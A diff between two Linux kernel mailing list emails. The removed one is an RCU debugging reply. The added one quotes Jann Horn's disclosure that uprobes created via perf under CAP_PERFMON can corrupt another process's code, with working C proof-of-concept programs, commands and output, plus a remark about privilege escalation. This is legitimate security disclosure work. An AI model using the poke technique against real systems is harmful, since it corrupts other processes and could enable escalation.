@@ -1,105 +1,209 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8445D4C62;
-	Wed,  2 Jul 2025 11:11:33 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
+Received: from foss.arm.com (foss.arm.com [217.140.110.172])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5E72123956E;
+	Wed,  2 Jul 2025 11:13:24 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.140.110.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1751454693; cv=none; b=O7iF8e8A3eFUgd33GYVHCvCbmweD7OoyTwq/ntRRDnJIhwKRULTpDdMPVY9Ll19lFO45ughR03Bb7Qxee8RHEXjeJ8uP9ssIilJvHCHxh88ZZqRsS7Nx02J83XBo/sR9shmVMtRz/UDSsgJMS4UsEu/Mf0mHJaRFdQBC7v4RpDE=
+	t=1751454806; cv=none; b=M65k/MUrHDWp/fud7jB0wRiyZ5dc8qbYFmDVUN9oa8551pXv9HGgqmSSayeqcu2CyG1Aknu9cxMYrCVwMd4w44FFtSeHww+93W2vPVqEVm0/gUqkg4KIIcJNeTsZDJYGqLmhFxH0CpCOE6GSQscSXavLQS+rJVX9ZmsaEesRSf0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1751454693; c=relaxed/simple;
-	bh=a+vFWdK2Bu0il04uJBl9lLaE09MP8HIkf+V0dwPCQa4=;
+	s=arc-20240116; t=1751454806; c=relaxed/simple;
+	bh=O4m4hWzSFeOYN9mZ0ZgX38tbQ6F3yuF4mDW0ZT8cyHc=;
 	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=rEhTIIrRRhXr95DX/Vxjlgh6SQxaR+E1n6WMVaNZoAhbuYAC4mzTm5iEHufeGox6c+F2YU1eTluaiZRm/iWjcOL5VV1uTZYgGK1XdpM9z3nOnHEXywk4ORs/ath9YNOpNsGPF5H/yNg+jesca6l7S3JyCasTD4q+lmgBbrI0kqs=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=RMaJhbbu; arc=none smtp.client-ip=10.30.226.201
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="RMaJhbbu"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 8DD93C4CEED;
-	Wed,  2 Jul 2025 11:11:32 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1751454693;
-	bh=a+vFWdK2Bu0il04uJBl9lLaE09MP8HIkf+V0dwPCQa4=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=RMaJhbbuM+14scJcn9PUy5jrz9q2+6jMWFTQwZ2Yxp2/G1oV/GhBetNsu1FRzkOex
-	 5J1H/vHHULtWwYK1wUTBC2AyIrMNPFuSVS01jaSa0mI2CmolOTXEOvRF5iBcGtzHAT
-	 NM24UeUx2Q8rKo2RxTTYdS09FSs5uZ728nei00kuXO07GJtLQLN7wVbg7KANaZvha0
-	 uIdMWnEhuQIx8HQ/Ljoeio4dRTvaWII/6PueR4uUh86h7gAE4r7JuDoL/JuHdx/z+T
-	 ULximuZxudW7l9cAD7upv/wtu3LciRdxiXHzXYS5hU27whdgz812WkT1W3Tf1rD/dy
-	 zUOYeWZ2b0a8Q==
-Date: Wed, 2 Jul 2025 13:11:30 +0200
-From: Frederic Weisbecker <frederic@kernel.org>
-To: Joel Fernandes <joelagnelf@nvidia.com>
-Cc: Qi Xi <xiqi2@huawei.com>, paulmck@kernel.org,
-	Xiongfeng Wang <wangxiongfeng2@huawei.com>,
-	Joel Fernandes <joel@joelfernandes.org>, ankur.a.arora@oracle.com,
-	Boqun Feng <boqun.feng@gmail.com>, neeraj.upadhyay@kernel.org,
-	urezki@gmail.com, rcu@vger.kernel.org, linux-kernel@vger.kernel.org,
-	"Wangshaobo (bobo)" <bobo.shaobowang@huawei.com>,
-	Xie XiuQi <xiexiuqi@huawei.com>
-Subject: Re: [QUESTION] problems report: rcu_read_unlock_special() called in
- irq_exit() causes dead loop
-Message-ID: <aGUT4sCXE_56Wsv-@localhost.localdomain>
-References: <20250603185939.GA1109523@joelnvbox>
- <066e8121-c6c5-48ac-b35a-e6430d986dff@nvidia.com>
- <a82784fd-d51e-4ea2-9d5c-43db971a3074@nvidia.com>
- <c448118b-9f7e-4c29-d6b3-a66e70f7163f@huawei.com>
- <a963b475-72cd-474d-96d4-9e651fc8f857@paulmck-laptop>
- <e7354668-2573-4564-834b-44d76d983222@nvidia.com>
- <09e4d018-3db4-404e-a8f0-041cdee15a62@huawei.com>
- <279d2f06-d4f7-46e1-9678-999a2d19b710@nvidia.com>
- <506d8c4e-c317-4c85-9bcf-695596551d28@huawei.com>
- <166bc5aa-a715-438e-8805-c74c2b5fc83b@nvidia.com>
+	 Content-Type:Content-Disposition:In-Reply-To; b=l1XWStTBuDdiJEYt+mOO31EkBQgi7F7GInmEgOa56Dx1hS1bp1MREI4P4ZP/ydz9NJzgt6RUrq+zP4ykyNTKh89Fb82x+FJgx3fSF3g2rzncmw8N58MXhGE50YoeJYdMRyyeeY2f96j8RPL55n7tkqCcpXA3b0GNfI/T2RF2bSg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com; spf=pass smtp.mailfrom=arm.com; arc=none smtp.client-ip=217.140.110.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=arm.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=arm.com
+Received: from usa-sjc-imap-foss1.foss.arm.com (unknown [10.121.207.14])
+	by usa-sjc-mx-foss1.foss.arm.com (Postfix) with ESMTP id 9351B22D9;
+	Wed,  2 Jul 2025 04:13:08 -0700 (PDT)
+Received: from J2N7QTR9R3 (usa-sjc-imap-foss1.foss.arm.com [10.121.207.14])
+	by usa-sjc-imap-foss1.foss.arm.com (Postfix) with ESMTPSA id 17FBE3F6A8;
+	Wed,  2 Jul 2025 04:13:19 -0700 (PDT)
+Date: Wed, 2 Jul 2025 12:13:17 +0100
+From: Mark Rutland <mark.rutland@arm.com>
+To: Jann Horn <jannh@google.com>
+Cc: Serge Hallyn <serge@hallyn.com>,
+	linux-security-module <linux-security-module@vger.kernel.org>,
+	Peter Zijlstra <peterz@infradead.org>,
+	Ingo Molnar <mingo@redhat.com>,
+	Arnaldo Carvalho de Melo <acme@kernel.org>,
+	Namhyung Kim <namhyung@kernel.org>,
+	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
+	Jiri Olsa <jolsa@kernel.org>, Ian Rogers <irogers@google.com>,
+	Adrian Hunter <adrian.hunter@intel.com>,
+	"Liang, Kan" <kan.liang@linux.intel.com>,
+	linux-perf-users@vger.kernel.org,
+	Kernel Hardening <kernel-hardening@lists.openwall.com>,
+	linux-hardening@vger.kernel.org,
+	kernel list <linux-kernel@vger.kernel.org>,
+	Alexey Budankov <alexey.budankov@linux.intel.com>,
+	James Morris <jamorris@linux.microsoft.com>
+Subject: Re: uprobes are destructive but exposed by perf under CAP_PERFMON
+Message-ID: <aGUUTII8p3x29VEw@J2N7QTR9R3>
+References: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
+Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <166bc5aa-a715-438e-8805-c74c2b5fc83b@nvidia.com>
+In-Reply-To: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
 
-Le Wed, Jul 02, 2025 at 06:59:38AM -0400, Joel Fernandes a écrit :
-> 
-> 
-> On 7/2/2025 5:14 AM, Qi Xi wrote:
-> > Hi Joel,
-> > 
-> > After applying the 2 patches, the problem still exists. Compared to the previous
-> > fixes which did solve the problem, the difference is ct_in_irq() in the first
-> > patch.
-> > 
-> > I am wondering why "nesting != CT_NESTING_IRQ_NONIDLE" is added?
-> > 
-> > 
-> > (previous fix: problem is solved)
-> > 
-> > +bool ct_in_irq(void)
-> > +{
-> > +    return ct_nmi_nesting() != 0;
-> > +}
-> > 
-> > (current fix: problem still exists)
-> > 
-> > +bool ct_in_irq(void)
-> > +{
-> > +    long nesting = ct_nmi_nesting();
-> > +
-> > +    return (nesting && nesting != CT_NESTING_IRQ_NONIDLE);
-> > +}
-> 
-> Oh gosh, thanks for spotting that! Indeed,  I had changed it to != 0 in the last
-> version but applied an older patch. I will fix it in the tree. Thank you again!
-> 
-> Neeraj, would you like this as a separate commit that you can then squash? Or
-> could you fix it up in your tree?
+On Tue, Jul 01, 2025 at 06:14:51PM +0200, Jann Horn wrote:
+> Since commit c9e0924e5c2b ("perf/core: open access to probes for
+> CAP_PERFMON privileged process"), it is possible to create uprobes
+> through perf_event_open() when the caller has CAP_PERFMON. uprobes can
+> have destructive effects, while my understanding is that CAP_PERFMON
+> is supposed to only let you _read_ stuff (like registers and stack
+> memory) from other processes, but not modify their execution.
 
-nesting == CT_NESTING_IRQ_NONIDLE means that the rcu_is_watching() and we are
-not in an interrupt. We still need to rule out that case, right?
+I'm not sure whether CAP_PERFMON is meant to ensure that, or simply
+meant to provide lesser privileges than CAP_SYS_ADMIN, so I'll have to
+leave that discussion to others. I agree it seems undesirable to permit
+destructive effects.
 
-Is there something else that makes it not working?
+> uprobes (at least on x86) can be destructive because they have no
+> protection against poking in the middle of an instruction; basically
+> as long as the kernel manages to decode the instruction bytes at the
+> caller-specified offset as a relocatable instruction, a breakpoint
+> instruction can be installed at that offset.
 
--- 
-Frederic Weisbecker
-SUSE Labs
+FWIW, similar issues would apply to other architectures (even those like
+arm64 where instuctions are fixed-size and naturally aligned), as a
+uprobe could be placed on a literal pool in a text section, corrupting
+data.
+
+It looks like c9e0924e5c2b reverts cleanly, so that's an option.
+
+Mark.
+
+> This means uprobes can be used to alter what happens in another
+> process. It would probably be a good idea to go back to requiring
+> CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
+> where the kernel can prove that the software breakpoint poke cannot
+> break the target process. (Which seems harder than doing it for
+> kprobe, since kprobe can at least rely on symbols to figure out where
+> a function starts...)
+> 
+> As a small example, in one terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
+> #include <unistd.h>
+> #include <stdio.h>
+> 
+> __attribute__((noinline))
+> void bar(unsigned long value) {
+>   printf("bar(0x%lx)\n", value);
+> }
+> 
+> __attribute__((noinline))
+> void foo(unsigned long value) {
+>   value += 0x90909090;
+>   bar(value);
+> }
+> 
+> void (*foo_ptr)(unsigned long value) = foo;
+> 
+> int main(void) {
+>   while (1) {
+>     printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
+> *)(void*)foo)[1]);
+>     foo_ptr(0);
+>     sleep(1);
+>   }
+> }
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
+> jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
+> [...]
+> 00000000000011b0 <foo>:
+>     11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
+>     11b5:       48 01 c7                add    %rax,%rdi
+>     11b8:       eb d6                   jmp    1190 <bar>
+> [...]
+> jannh@horn:~/test/perfmon-uprobepoke$ ./target
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> ```
+> 
+> and in another terminal:
+> ```
+> jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <unistd.h>
+> #include <err.h>
+> #include <sys/mman.h>
+> #include <sys/syscall.h>
+> #include <linux/perf_event.h>
+> 
+> int main(void) {
+>   int uprobe_type;
+>   FILE *uprobe_type_file =
+> fopen("/sys/bus/event_source/devices/uprobe/type", "r");
+>   if (uprobe_type_file == NULL)
+>     err(1, "fopen uprobe type");
+>   if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
+>     errx(1, "read uprobe type");
+>   fclose(uprobe_type_file);
+>   printf("uprobe type is %d\n", uprobe_type);
+> 
+>   unsigned long target_off;
+>   FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
+>   if (!pof)
+>     err(1, "popen nm");
+>   if (fscanf(pof, "%lx", &target_off) != 1)
+>     errx(1, "read target offset");
+>   pclose(pof);
+>   target_off += 1;
+>   printf("will poke at 0x%lx\n", target_off);
+> 
+>   struct perf_event_attr attr = {
+>     .type = uprobe_type,
+>     .size = sizeof(struct perf_event_attr),
+>     .sample_period = 100000,
+>     .sample_type = PERF_SAMPLE_IP,
+>     .uprobe_path = (unsigned long)"target",
+>     .probe_offset = target_off
+>   };
+>   int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
+>   if (perf_fd == -1)
+>     err(1, "perf_event_open");
+>   char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
+>   if (map == MAP_FAILED)
+>     err(1, "mmap error");
+>   printf("mmap success\n");
+>   while (1) pause();
+> jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
+> jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
+> jannh@horn:~/test/perfmon-uprobepoke$ ./poke
+> uprobe type is 9
+> will poke at 0x11b1
+> mmap success
+> ```
+> 
+> This results in the first terminal changing output as follows, showing
+> that 0xcc was written into the middle of the "mov" instruction,
+> modifying its immediate operand:
+> ```
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0x90
+> bar(0x90909090)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> byte 1 of foo(): 0xcc
+> bar(0x909090cc)
+> ```
+> 
+> It's probably possible to turn this into a privilege escalation by
+> doing things like clobbering part of the distance of a jump or call
+> instruction.
